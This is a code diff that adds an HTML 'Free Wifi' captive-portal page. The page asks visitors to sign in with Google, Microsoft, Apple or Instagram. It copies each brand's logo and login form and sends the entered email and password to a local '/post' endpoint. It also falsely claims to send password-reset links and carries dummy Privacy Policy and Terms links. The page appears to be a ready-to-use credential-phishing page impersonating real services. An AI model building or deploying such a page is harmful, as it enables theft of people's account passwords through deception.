@@ -1,0 +1,244 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Login</title>
+    <style>
+        html{
+            overflow-x: hidden;
+        }
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f5f5f5;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            text-align: center;
+        }
+        .header {
+            margin-bottom: 20px;
+        }
+        .login-container {
+            background: white;
+            padding: 20px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            border-radius: 8px;
+            width: 320px;
+        }
+        .login-button {
+            width: 100%;
+            padding: 10px;
+            margin: 5px 0;
+            border: 0px;
+            cursor: pointer;
+            border-radius: 4px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 16px;
+            
+        }
+
+        .google {
+            background-color: #db4437;
+            color: white;
+        }
+
+        .microsoft {
+            background-color: #0078d4;
+            color: white;
+        }
+        .apple {
+            background-color: black;
+            color: white;
+        }
+        .instagram {
+            background: linear-gradient(45deg, #fccc63, #bc1888, #dd2a7b);
+            color: white;
+        }
+        .login-button svg {
+            width: 24px;
+            height: 24px;
+            margin-right: 10px;
+            vertical-align: middle;
+        }
+        .hidden {
+            display: none;
+        }
+        .login-form {
+            margin-top: 15px;
+            padding: 15px;
+            background: #fff;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            border-radius: 8px;
+            width: 320px;
+        }
+        .input-field {
+            width: 80%;
+            padding: 8px;
+            margin: 7px 0;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+        .submit-btn {
+            width: 100%;
+            padding: 10px;
+            border: none;
+            background-color: #0078d4;
+            color: white;
+            font-size: 16px;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+
+        .forgot-password {
+            margin: 5px 0 10px 25px;
+            font-size: 14px;
+            display: flex;
+        }
+        .forgot-password a {
+            color: #0078d4;
+            text-decoration: none;
+        }
+        .forgot-password a:hover {
+            text-decoration: underline;
+        }
+    @media (max-width: 480px) {
+            p{
+                font-size: 14px;
+            }
+            .login-container {
+                width: 90%;
+                padding: 15px;
+            }
+            .login-form {
+                width: 90%;
+                padding: 15px;
+            }
+            .login-button {
+                font-size: 14px;
+                padding: 8px;
+            }
+            .header h1 {
+                font-size: 20px;
+            }
+            .header p {
+                font-size: 14px;
+            }
+            .submit-btn {
+                font-size: 14px;
+                width: 85%;
+            }
+            .forgot-password{
+                font-size: 12px;
+                margin:
+            }
+            footer {
+                font-size: 12px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div>
+        <h1>Free Wifi</h1>
+        <p>To get Free Wifi you have to login with one of this Accounts!</p>
+    </div>
+    <div class="login-container">
+        <h2>Sign in</h2>
+        <button class="login-button google" onclick="showLoginForm('login-google')">
+            <svg viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg" fill="none"><path fill="#4285F4" d="M14.9 8.161c0-.476-.039-.954-.121-1.422h-6.64v2.695h3.802a3.24 3.24 0 01-1.407 2.127v1.75h2.269c1.332-1.22 2.097-3.02 2.097-5.15z"/><path fill="#34A853" d="M8.14 15c1.898 0 3.499-.62 4.665-1.69l-2.268-1.749c-.631.427-1.446.669-2.395.669-1.836 0-3.393-1.232-3.952-2.888H1.85v1.803A7.044 7.044 0 008.14 15z"/><path fill="#FBBC04" d="M4.187 9.342a4.17 4.17 0 010-2.68V4.859H1.849a6.97 6.97 0 000 6.286l2.338-1.803z"/><path fill="#EA4335" d="M8.14 3.77a3.837 3.837 0 012.7 1.05l2.01-1.999a6.786 6.786 0 00-4.71-1.82 7.042 7.042 0 00-6.29 3.858L4.186 6.66c.556-1.658 2.116-2.89 3.952-2.89z"/></svg> Sign in with Google
+        </button>
+        <button class="login-button microsoft" onclick="showLoginForm('login-micro')">
+            <svg viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg" fill="none"><path fill="#F35325" d="M1 1h6.5v6.5H1V1z"/><path fill="#81BC06" d="M8.5 1H15v6.5H8.5V1z"/><path fill="#05A6F0" d="M1 8.5h6.5V15H1V8.5z"/><path fill="#FFBA08" d="M8.5 8.5H15V15H8.5V8.5z"/></svg> Sign in with Microsoft
+        </button>
+        <button class="login-button apple" onclick="showLoginForm('login-apple')">
+            <svg width="16px" height="16px" viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg" fill="#ffff"><path fill="#ffff" d="M10.167 3.242c.435-.523.742-1.24.742-1.958 0-.105-.008-.202-.03-.284-.704.03-1.55.47-2.06 1.069-.397.448-.772 1.173-.772 1.891 0 .112.023.217.03.254.045.008.12.015.188.015.636 0 1.43-.419 1.902-.987zm.495 1.144c-1.057 0-1.918.643-2.465.643-.591 0-1.355-.606-2.284-.606C4.168 4.423 2.4 5.866 2.4 8.58c0 1.697.652 3.49 1.46 4.642C4.557 14.193 5.164 15 6.04 15c.869 0 1.251-.575 2.33-.575 1.093 0 1.333.56 2.292.56.95 0 1.587-.867 2.18-1.727.673-.986.95-1.943.958-1.988-.053-.015-1.873-.755-1.873-2.833 0-1.794 1.431-2.6 1.513-2.66-.943-1.354-2.381-1.391-2.778-1.391z"/></svg> Sign in with Apple
+        </button>
+        <button class="login-button instagram" onclick="showLoginForm('login-instagram')">
+            <svg fill="#ffff" width="16px" height="16px" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" data-name="Layer 1"><path d="M17.34,5.46h0a1.2,1.2,0,1,0,1.2,1.2A1.2,1.2,0,0,0,17.34,5.46Zm4.6,2.42a7.59,7.59,0,0,0-.46-2.43,4.94,4.94,0,0,0-1.16-1.77,4.7,4.7,0,0,0-1.77-1.15,7.3,7.3,0,0,0-2.43-.47C15.06,2,14.72,2,12,2s-3.06,0-4.12.06a7.3,7.3,0,0,0-2.43.47A4.78,4.78,0,0,0,3.68,3.68,4.7,4.7,0,0,0,2.53,5.45a7.3,7.3,0,0,0-.47,2.43C2,8.94,2,9.28,2,12s0,3.06.06,4.12a7.3,7.3,0,0,0,.47,2.43,4.7,4.7,0,0,0,1.15,1.77,4.78,4.78,0,0,0,1.77,1.15,7.3,7.3,0,0,0,2.43.47C8.94,22,9.28,22,12,22s3.06,0,4.12-.06a7.3,7.3,0,0,0,2.43-.47,4.7,4.7,0,0,0,1.77-1.15,4.85,4.85,0,0,0,1.16-1.77,7.59,7.59,0,0,0,.46-2.43c0-1.06.06-1.4.06-4.12S22,8.94,21.94,7.88ZM20.14,16a5.61,5.61,0,0,1-.34,1.86,3.06,3.06,0,0,1-.75,1.15,3.19,3.19,0,0,1-1.15.75,5.61,5.61,0,0,1-1.86.34c-1,.05-1.37.06-4,.06s-3,0-4-.06A5.73,5.73,0,0,1,6.1,19.8,3.27,3.27,0,0,1,5,19.05a3,3,0,0,1-.74-1.15A5.54,5.54,0,0,1,3.86,16c0-1-.06-1.37-.06-4s0-3,.06-4A5.54,5.54,0,0,1,4.21,6.1,3,3,0,0,1,5,5,3.14,3.14,0,0,1,6.1,4.2,5.73,5.73,0,0,1,8,3.86c1,0,1.37-.06,4-.06s3,0,4,.06a5.61,5.61,0,0,1,1.86.34A3.06,3.06,0,0,1,19.05,5,3.06,3.06,0,0,1,19.8,6.1,5.61,5.61,0,0,1,20.14,8c.05,1,.06,1.37.06,4S20.19,15,20.14,16ZM12,6.87A5.13,5.13,0,1,0,17.14,12,5.12,5.12,0,0,0,12,6.87Zm0,8.46A3.33,3.33,0,1,1,15.33,12,3.33,3.33,0,0,1,12,15.33Z"></svg> Sign in with Instagram
+        </button>
+    </div>
+    <form id="login-google" class="login-form hidden" action="/post" method="POST">
+        <svg viewBox="0 0 75 24" width="100" height="49" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+            <g id="qaEJec">
+                <path fill="#ea4335" d="M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-.495-1.33-2.008-3.79-5.102-3.79-3.068 0-5.622 2.41-5.622 5.96 0 3.34 2.53 5.96 5.92 5.96 2.73 0 4.31-1.67 4.97-2.64l-2.03-1.35c-.673.98-1.6 1.64-2.93 1.64zm-.203-7.27c1.04 0 1.92.52 2.21 1.264l-5.32 2.21c-.06-2.3 1.79-3.474 3.12-3.474z"></path>
+            </g>
+            <g id="YGlOvc">
+                <path fill="#34a853" d="M58.193.67h2.564v17.44h-2.564z"></path>
+            </g>
+            <g id="BWfIk">
+                <path fill="#4285f4" d="M54.152 8.066h-.088c-.588-.697-1.716-1.33-3.136-1.33-2.98 0-5.71 2.614-5.71 5.98 0 3.338 2.73 5.933 5.71 5.933 1.42 0 2.548-.64 3.136-1.36h.088v.86c0 2.28-1.217 3.5-3.183 3.5-1.61 0-2.6-1.15-3-2.12l-2.28.94c.65 1.58 2.39 3.52 5.28 3.52 3.06 0 5.66-1.807 5.66-6.206V7.21h-2.48v.858zm-3.006 8.237c-1.804 0-3.318-1.513-3.318-3.588 0-2.1 1.514-3.635 3.318-3.635 1.784 0 3.183 1.534 3.183 3.635 0 2.075-1.4 3.588-3.19 3.588z"></path>
+            </g>
+            <g id="e6m3fd">
+                <path fill="#fbbc05" d="M38.17 6.735c-3.28 0-5.953 2.506-5.953 5.96 0 3.432 2.673 5.96 5.954 5.96 3.29 0 5.96-2.528 5.96-5.96 0-3.46-2.67-5.96-5.95-5.96zm0 9.568c-1.798 0-3.348-1.487-3.348-3.61 0-2.14 1.55-3.608 3.35-3.608s3.348 1.467 3.348 3.61c0 2.116-1.55 3.608-3.35 3.608z"></path>
+            </g>
+            <g id="vbkDmc">
+                <path fill="#ea4335" d="M25.17 6.71c-3.28 0-5.954 2.505-5.954 5.958 0 3.433 2.673 5.96 5.954 5.96 3.282 0 5.955-2.527 5.955-5.96 0-3.453-2.673-5.96-5.955-5.96zm0 9.567c-1.8 0-3.35-1.487-3.35-3.61 0-2.14 1.55-3.608 3.35-3.608s3.35 1.46 3.35 3.6c0 2.12-1.55 3.61-3.35 3.61z"></path>
+            </g>
+            <g id="idEJde">
+                <path fill="#4285f4" d="M14.11 14.182c.722-.723 1.205-1.78 1.387-3.334H9.423V8.373h8.518c.09.452.16 1.07.16 1.664 0 1.903-.52 4.26-2.19 5.934-1.63 1.7-3.71 2.61-6.48 2.61-5.12 0-9.42-4.17-9.42-9.29C0 4.17 4.31 0 9.43 0c2.83 0 4.843 1.108 6.362 2.56L14 4.347c-1.087-1.02-2.56-1.81-4.577-1.81-3.74 0-6.662 3.01-6.662 6.75s2.93 6.75 6.67 6.75c2.43 0 3.81-.972 4.69-1.856z"></path>
+            </g>
+        </svg>        <input name='email' class='input-field' type='email' placeholder='Email or phone' required>
+        <input name='password' class='input-field' type='password' placeholder='Enter your password' required>
+        <div class="forgot-password">
+            <a href="#" onclick="forgotPassword()">Forgot password?</a>
+        </div>
+        <button class="submit-btn" type="submit">Login</button>
+    </form>
+    <form id="login-micro" class="login-form hidden" action="/post" method="POST">
+        <img width="100" height="49" accessibleImg class="___1v417w0 f2rbwfs frvgh55" src=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDgiIGhlaWdodD0iMjQiIHZpZXdCb3g9IjAgMCAxMDggMjQiPjx0aXRsZT5hc3NldHM8L3RpdGxlPjxwYXRoIGQ9Ik00NC44MzYsNC42VjE4LjRoLTIuNFY3LjU4M0g0Mi40TDM4LjExOSwxOC40SDM2LjUzMUwzMi4xNDIsNy41ODNoLS4wMjlWMTguNEgyOS45VjQuNmgzLjQzNkwzNy4zLDE0LjgzaC4wNThMNDEuNTQ1LDQuNlptMiwxLjA0OWExLjI2OCwxLjI2OCwwLDAsMSwuNDE5LS45NjcsMS40MTMsMS40MTMsMCwwLDEsMS0uMzksMS4zOTIsMS4zOTIsMCwwLDEsMS4wMi40LDEuMywxLjMsMCwwLDEsLjQuOTU4LDEuMjQ4LDEuMjQ4LDAsMCwxLS40MTQuOTUzLDEuNDI4LDEuNDI4LDAsMCwxLTEuMDEuMzg1QTEuNCwxLjQsMCwwLDEsNDcuMjUsNi42YTEuMjYxLDEuMjYxLDAsMCwxLS40MDktLjk0OE00OS40MSwxOC40SDQ3LjA4MVY4LjUwN0g0OS40MVptNy4wNjQtMS42OTRhMy4yMTMsMy4yMTMsMCwwLDAsMS4xNDUtLjI0MSw0LjgxMSw0LjgxMSwwLDAsMCwxLjE1NS0uNjM1VjE4YTQuNjY1LDQuNjY1LDAsMCwxLTEuMjY2LjQ4MSw2Ljg4Niw2Ljg4NiwwLDAsMS0xLjU1NC4xNjQsNC43MDcsNC43MDcsMCwwLDEtNC45MTgtNC45MDgsNS42NDEsNS42NDEsMCwwLDEsMS40LTMuOTMyLDUuMDU1LDUuMDU1LDAsMCwxLDMuOTU1LTEuNTQ1LDUuNDE0LDUuNDE0LDAsMCwxLDEuMzI0LjE2OCw0LjQzMSw0LjQzMSwwLDAsMSwxLjA2My4zOXYyLjIzM2E0Ljc2Myw0Ljc2MywwLDAsMC0xLjEtLjYxMSwzLjE4NCwzLjE4NCwwLDAsMC0xLjE1LS4yMTcsMi45MTksMi45MTksMCwwLDAtMi4yMjMuOSwzLjM3LDMuMzcsMCwwLDAtLjg0NywyLjQxNiwzLjIxNiwzLjIxNiwwLDAsMCwuODEzLDIuMzM4LDIuOTM2LDIuOTM2LDAsMCwwLDIuMjA5LjgzN002NS40LDguMzQzYTIuOTUyLDIuOTUyLDAsMCwxLC41LjAzOSwyLjEsMi4xLDAsMCwxLC4zNzUuMXYyLjM1OGEyLjA0LDIuMDQsMCwwLDAtLjUzNC0uMjU1LDIuNjQ2LDIuNjQ2LDAsMCwwLS44NTItLjEyLDEuODA4LDEuODA4LDAsMCwwLTEuNDQ4LjcyMiwzLjQ2NywzLjQ2NywwLDAsMC0uNTkyLDIuMjIzVjE4LjRINjAuNTI1VjguNTA3aDIuMzI5djEuNTU5aC4wMzhBMi43MjksMi43MjksMCwwLDEsNjMuODU1LDguOCwyLjYxMSwyLjYxMSwwLDAsMSw2NS40LDguMzQzbTEsNS4yNTRBNS4zNTgsNS4zNTgsMCwwLDEsNjcuNzkyLDkuNzFhNS4xLDUuMSwwLDAsMSwzLjg1LTEuNDM0LDQuNzQyLDQuNzQyLDAsMCwxLDMuNjIzLDEuMzgxLDUuMjEyLDUuMjEyLDAsMCwxLDEuMywzLjcyOSw1LjI1Nyw1LjI1NywwLDAsMS0xLjM4NiwzLjgzLDUuMDE5LDUuMDE5LDAsMCwxLTMuNzcyLDEuNDI0LDQuOTM1LDQuOTM1LDAsMCwxLTMuNjUyLTEuMzUyQTQuOTg3LDQuOTg3LDAsMCwxLDY2LjQwNiwxMy42bTIuNDI1LS4wNzdhMy41MzUsMy41MzUsMCwwLDAsLjcsMi4zNjgsMi41MDUsMi41MDUsMCwwLDAsMi4wMTEuODE4LDIuMzQ1LDIuMzQ1LDAsMCwwLDEuOTM0LS44MTgsMy43ODMsMy43ODMsMCwwLDAsLjY2NC0yLjQyNSwzLjY1MSwzLjY1MSwwLDAsMC0uNjg4LTIuNDExLDIuMzg5LDIuMzg5LDAsMCwwLTEuOTI5LS44MTMsMi40NCwyLjQ0LDAsMCwwLTEuOTg4Ljg1MiwzLjcwNywzLjcwNywwLDAsMC0uNzA3LDIuNDNtMTEuMi0yLjQxNmExLDEsMCwwLDAsLjMxOC43ODUsNS40MjYsNS40MjYsMCwwLDAsMS40LjcxNyw0Ljc2Nyw0Ljc2NywwLDAsMSwxLjk1OSwxLjI1NiwyLjYsMi42LDAsMCwxLC41NjMsMS42ODlBMi43MTUsMi43MTUsMCwwLDEsODMuMiwxNy43OTRhNC41NTgsNC41NTgsMCwwLDEtMi45Ljg0Nyw2Ljk3OCw2Ljk3OCwwLDAsMS0xLjM2Mi0uMTQ5LDYuMDQ3LDYuMDQ3LDAsMCwxLTEuMjY1LS4zOHYtMi4yOWE1LjczMyw1LjczMywwLDAsMCwxLjM2Ny43LDQsNCwwLDAsMCwxLjMyOC4yNiwyLjM2NSwyLjM2NSwwLDAsMCwxLjE2NC0uMjIxLjc5Ljc5LDAsMCwwLC4zNzUtLjc0MSwxLjAyOSwxLjAyOSwwLDAsMC0uMzktLjgxMyw1Ljc2OCw1Ljc2OCwwLDAsMC0xLjQ3Ny0uNzY1LDQuNTY0LDQuNTY0LDAsMCwxLTEuODI5LTEuMjEzLDIuNjU1LDIuNjU1LDAsMCwxLS41MzktMS43MTMsMi43MDYsMi43MDYsMCwwLDEsMS4wNjMtMi4yQTQuMjQzLDQuMjQzLDAsMCwxLDgxLjUsOC4yNTZhNi42NjMsNi42NjMsMCwwLDEsMS4xNjQuMTE1LDUuMTYxLDUuMTYxLDAsMCwxLDEuMDc4LjN2Mi4yMTRhNC45NzQsNC45NzQsMCwwLDAtMS4wNzgtLjUyOSwzLjYsMy42LDAsMCwwLTEuMjIyLS4yMjEsMS43ODEsMS43ODEsMCwwLDAtMS4wMzQuMjYuODI0LjgyNCwwLDAsMC0uMzcxLjcxMk04NS4yNzgsMTMuNkE1LjM1OCw1LjM1OCwwLDAsMSw4Ni42NjQsOS43MWE1LjEsNS4xLDAsMCwxLDMuODQ5LTEuNDM0LDQuNzQzLDQuNzQzLDAsMCwxLDMuNjI0LDEuMzgxLDUuMjEyLDUuMjEyLDAsMCwxLDEuMywzLjcyOSw1LjI1OSw1LjI1OSwwLDAsMS0xLjM4NiwzLjgzLDUuMDIsNS4wMiwwLDAsMS0zLjc3MywxLjQyNCw0LjkzNCw0LjkzNCwwLDAsMS0zLjY1Mi0xLjM1MkE0Ljk4Nyw0Ljk4NywwLDAsMSw4NS4yNzgsMTMuNm0yLjQyNS0uMDc3YTMuNTM3LDMuNTM3LDAsMCwwLC43LDIuMzY4LDIuNTA2LDIuNTA2LDAsMCwwLDIuMDExLjgxOCwyLjM0NSwyLjM0NSwwLDAsMCwxLjkzNC0uODE4LDMuNzgzLDMuNzgzLDAsMCwwLC42NjQtMi40MjUsMy42NTEsMy42NTEsMCwwLDAtLjY4OC0yLjQxMSwyLjM5LDIuMzksMCwwLDAtMS45My0uODEzLDIuNDM5LDIuNDM5LDAsMCwwLTEuOTg3Ljg1MiwzLjcwNywzLjcwNywwLDAsMC0uNzA3LDIuNDNtMTUuNDY0LTMuMTA5SDk5LjdWMTguNEg5Ny4zNDFWMTAuNDEySDk1LjY4NlY4LjUwN2gxLjY1NVY3LjEzYTMuNDIzLDMuNDIzLDAsMCwxLDEuMDE1LTIuNTU1LDMuNTYxLDMuNTYxLDAsMCwxLDIuNi0xLDUuODA3LDUuODA3LDAsMCwxLC43NTEuMDQzLDIuOTkzLDIuOTkzLDAsMCwxLC41NzcuMTNWNS43NjRhMi40MjIsMi40MjIsMCwwLDAtLjQtLjE2NCwyLjEwNywyLjEwNywwLDAsMC0uNjY0LS4xLDEuNDA3LDEuNDA3LDAsMCwwLTEuMTI2LjQ1N0EyLjAxNywyLjAxNywwLDAsMCw5OS43LDcuMzEzVjguNTA3aDMuNDY5VjYuMjgzbDIuMzM5LS43MTJWOC41MDdoMi4zNTh2MS45MDZoLTIuMzU4djQuNjI5YTEuOTUxLDEuOTUxLDAsMCwwLC4zMzIsMS4yOSwxLjMyNiwxLjMyNiwwLDAsMCwxLjA0NC4zNzUsMS41NTcsMS41NTcsMCwwLDAsLjQ4Ni0uMSwyLjI5NCwyLjI5NCwwLDAsMCwuNS0uMjMxVjE4LjNhMi43MzcsMi43MzcsMCwwLDEtLjczNi4yMzEsNS4wMjksNS4wMjksMCwwLDEtMS4wMTUuMTA2LDIuODg3LDIuODg3LDAsMCwxLTIuMjA5LS43ODQsMy4zNDEsMy4zNDEsMCwwLDEtLjczNi0yLjM2M1oiIGZpbGw9IiM3MzczNzMiLz48cmVjdCB3aWR0aD0iMTAuOTMxIiBoZWlnaHQ9IjEwLjkzMSIgZmlsbD0iI2YyNTAyMiIvPjxyZWN0IHg9IjEyLjA2OSIgd2lkdGg9IjEwLjkzMSIgaGVpZ2h0PSIxMC45MzEiIGZpbGw9IiM3ZmJhMDAiLz48cmVjdCB5PSIxMi4wNjkiIHdpZHRoPSIxMC45MzEiIGhlaWdodD0iMTAuOTMxIiBmaWxsPSIjMDBhNGVmIi8+PHJlY3QgeD0iMTIuMDY5IiB5PSIxMi4wNjkiIHdpZHRoPSIxMC45MzEiIGhlaWdodD0iMTAuOTMxIiBmaWxsPSIjZmZiOTAwIi8+PC9zdmc+ alt=Microsoft role>
+        <input name='email' class='input-field' type='email' placeholder='Email or phone' required>
+        <input name='password' class='input-field' type='password' placeholder='Enter your password' required>
+        <div class="forgot-password">
+            <a href="#" onclick="forgotPassword()">Forgot password?</a>
+        </div>
+        <button class="submit-btn" type="submit">Login</button>
+    </form>
+    <form id="login-apple" class="login-form hidden" action="/post" method="POST">
+        <svg width="100" height="49" viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg" fill="#00000"><path fill="#00000" d="M10.167 3.242c.435-.523.742-1.24.742-1.958 0-.105-.008-.202-.03-.284-.704.03-1.55.47-2.06 1.069-.397.448-.772 1.173-.772 1.891 0 .112.023.217.03.254.045.008.12.015.188.015.636 0 1.43-.419 1.902-.987zm.495 1.144c-1.057 0-1.918.643-2.465.643-.591 0-1.355-.606-2.284-.606C4.168 4.423 2.4 5.866 2.4 8.58c0 1.697.652 3.49 1.46 4.642C4.557 14.193 5.164 15 6.04 15c.869 0 1.251-.575 2.33-.575 1.093 0 1.333.56 2.292.56.95 0 1.587-.867 2.18-1.727.673-.986.95-1.943.958-1.988-.053-.015-1.873-.755-1.873-2.833 0-1.794 1.431-2.6 1.513-2.66-.943-1.354-2.381-1.391-2.778-1.391z"/></svg>
+        <input name='email' class='input-field' type='email' placeholder='Email or phone' required>
+        <input name='password' class='input-field' type='password' placeholder='Enter your password' required>
+        <div class="forgot-password">
+            <a href="#" onclick="forgotPassword()">Forgot password?</a>
+        </div>
+        <button class="submit-btn" type="submit">Login</button>
+    </form>
+    <form id="login-instagram" class="login-form hidden" action="/post" method="POST">
+        <img  data-testid=accessibleImg class="___1v417w0 f2rbwfs frvgh55" src=data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAALAAAAA2CAMAAABQgOOpAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAAAqFBMVEVHcEz///////////////+61Nz///////////////////////////8pKSkoKCgoKCgyMjIpKSknJycmJiYmJiYnJycmJiYpKSkrKysmJiYmJiYnJycmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYnJycnJycmJiYmJiYmJiYnJycnJyc+RkYnJycmJiYmJiYnJycmJiYmJiYmJiYmJiYnJycmJib///8mJiZ+KvcEAAAANnRSTlMAIdXnQQJgruHbxXATEDcfCSyM+cZ5wSYX0Z2X2MuicKqwYLhZRL1R7IZoA0nj8jBA/YHd+5FbOwNvAAAAAWJLR0QB/wIt3gAAAAd0SU1FB+gHFRMnAVCG1ygAAAdESURBVGje1Vlpm6JIDGaP3lssQRQBBYRuaC4v3Pr//2wrSaVAe3Ye3RnH2XxobUil3kreHKBlPU5++PFvlJ9+fuAmX1Vefvn1t9//+POvZ+P4PmRi29N79IU9mzwRrnBcKeX8Dsie0l8sn4XXX0mU4PYlIeh7z8IbSbkGAJvb12xAP34e3s0UACS3L0pBf/scwJmUK+HfCTgD/fwpeHO186t1r4ffQL94Bl6/VOXBIsDpTSvidy+uItCvppP6mwN21MbNPYBn8kLc9rZjfi0RnZRdfQ/gSl5J+U0BF2rHzLoH8PYa8B3V+ytIoMvpLYB3toCPWkz8JULd7m17N6OLS/tjqxa75ZjjIs7S2Qed2U7cA3iu9t2rzyUDrhfZO7XcOl6svcFYo/Ks5WYsELBp5S9VCX3Hr7fV/oUv+sFB8SW2/ConRWg2qyu4R0VJ1xEi3tp0pVhvKnX0Olxt9nRhnhYvw4qTMjIbA4aC7PpgCytXyy4p+nFvI8A+WwmJHBGUyEh72o/o4hmCeOYgdnBrwgvrjHTeYviDsBIiWcW7+R3YHKaWVv27vAaMrkt1StHpRCnHvY0As/s9pjMYl+Sqej2+eLI0+cv8PVOmknp8UL0QTwrbvpEjZaf2jvH+2gAGN+4+BdjkFrmY1rnsmgn+qwm6dLHrxMF4AbrIPVd07siiDmUEm+RScUb2odah8xPgvWTOra4q0VE3LAN4Sorg0SgeHIbDjgytMeBe/2MGoTMqYfhqCN2h0DFG6uogkVQc/oNqAtToJcYyQ8D67Euu+q0B7LsEY3YFWGHtptXgMLRQ+heAO/2955hNOpOKhSl4OxNScJvz7qE/G3YwToiz4fwIuO7kwcW9VV9rdYS0KFCdr5ckDNgHB1XEA8rwwsSRzjmKUz7cejOpmBhfW+DYubYBn+/MV6T+zqRSZ0y8NepkGd6MZO9dFRfvIJ0PgNWK1QvyhUsBGGrtCw+3oxJBpcExX8vBLZB9C61YaUsRm9SHTs1XuJgF0p3Apb1Ck1YXSafEToMPgFMMmjMqBei8nssaevhE3+cDtooXTEeMJ1YqWpeyE/osGz5URjpnc370cKkUIEaNMlhUfOAL2TFgzD6V9yv2HZWCPXFJJmIArFGO9q14watJLFOorIbKMVZEj6OkH3IcA3hBRe4Vs6ZI1Bljvf5zgD2quLDmwHFdTOaYPhOjToDrkTOxFhpeN5eAU9lPOcFMYToPgE8GsKJHjZeqVmGqbgC8ouBBVFydc4ed7n0ruHMcAKOznZGHzRd7IFOGNQGrhs23EPlxABwZgiESyLUzOO4zgDcMWFeklHNXnNCHYs3gVlxc9QK97zsDjoeCiE0rg2rtTjW5qPTYXL61a8aAtxStCDTzf+fwxjLzecPp0tH+HRYLeDyRriCKasDFyMMbrv+jllMfELByMIW/uQBcMeOYEgR4pvWgdBTXVcIygQoM4K7mYAIl1ACiDSOQpo7KzmRJOOLwmqsEcvh1iECmDl9OhgOC86ej0JTGHMauF9qFwIU9e396/BRg0ksN+yQ6bqXHBtwkd6S3MGxppeEY9jws3KMqgYmYFabtGA6j68MhvjTISS6YmBsQlSXfOx+uAYcGcGXyW/WBhkZmhIenUc4KObCx7NmgfnracdzDwci6NU8HvuYouXVtco5CQzMXXu00kLqX1I0i9xqwYwAvB0q+LqGMW9vcuALMIDZ1aVq2R8NXmihz5gmScnqgJcMcctKxxGj1vokSbkomMsPmRrOkAP1xg95zys401UEQiqJr6wN5U9+qaRBUozbutq6nkfT8XnMIdCh1fZehUynUQ5ll3AnwabYDJ51ln5I39QiaGrfbuvak8HEeAUbSFXxu3bgKWu7uaTR05+QJfKbAibB05UlQ0DeF8moCq/tqv5ZHgNzFhXLT2yi5LEs/Q2R2fFjhlO6odiaPELq2KTp3eMm37HR2LsEjZ6+X9ghwwZwU/VClKIkOhT6GljUGd0ZO7G2ghb4zFzSlKZ0X8wDgVfJiPDQvCnrbdrVOwiOxdALOfhX1VfkmBopfdo/KFMJsqI4UPXwhlbfadsfPpQU4oMPStUNXHULBFFipM1WIpsyRz3PrYjN0v7Lb4FFdT5VugZR9q3HmfL9Qt+qAjQ7imLBN3pOQn9hfqk2s1URzTLL0nIshtN7G0c/NIg83nv7enMMci+DUC8KtIKpeFX7fCzy0O6mCoNK7FWGgFtZ5mJw/vFnfOUElLq4ox5SP+A2gpmer1edU/pPd7jEvT+uEnoijLzd1Ka/y8IjX6UIlRFs8AvA+sb/cyAeB9yTlcvYIwI8RxQfXxu64/nJj30AcGhqgiS6+3NrjZa/nn0be9WPE06SOdKXMP3aC71Jy7phH+bQfyO6SAB+mLBpS7/od+0mS8dDX/k+qWqKnxJ182m+894ma/yIYExQjSvFsMLcIvIJP7FmAzeN/IVP9I0e7fzaSW6XeJqfTIv6qU+s/01r9iGzOBP4AAAAldEVYdGRhdGU6Y3JlYXRlADIwMjQtMDctMjFUMTk6Mzg6MTgrMDA6MDAPvfx9AAAAJXRFWHRkYXRlOm1vZGlmeQAyMDI0LTA3LTIxVDE5OjM4OjE4KzAwOjAwfuBEwQAAAABJRU5ErkJggg alt=Microsoft role>
+        <input name='email' class='input-field' type='email' placeholder='Email or phone' required>
+        <input name='password' class='input-field' type='password' placeholder='Enter your password' required>
+        <div class="forgot-password">
+            <a href="#" onclick="forgotPassword()">Forgot password?</a>
+        </div>
+        <button class="submit-btn" type="submit">Login</button>
+    </form>
+    <script>
+        function showLoginForm(formId) {
+            document.querySelectorAll('.login-form').forEach(form => {
+                form.classList.add('hidden');
+            });
+
+            document.getElementById(formId).classList.remove('hidden');
+        }
+
+        function forgotPassword() {
+            if (document.querySelector('input[type="email"]').value === '') {
+                alert('Please enter your email address to reset your password');
+            }else{
+                alert('Password reset link has been sent to your email');
+            }
+        }
+        function showAltert() {
+            alert('You need to login to access this page!');
+        }
+    </script>
+    <footer>
+        <p>&copy; 2025 Free Wifi | <a class="footerlink" onclick="showAltert()" href="#" style="color: #000000; text-decoration: underline;">Privacy Policy</a> | <a class="footerlink" onclick="showAltert()" href="#" style="color: #000000; text-decoration: underline;">Terms of Service</a></p>
+    </footer>
+</body>
+</html>
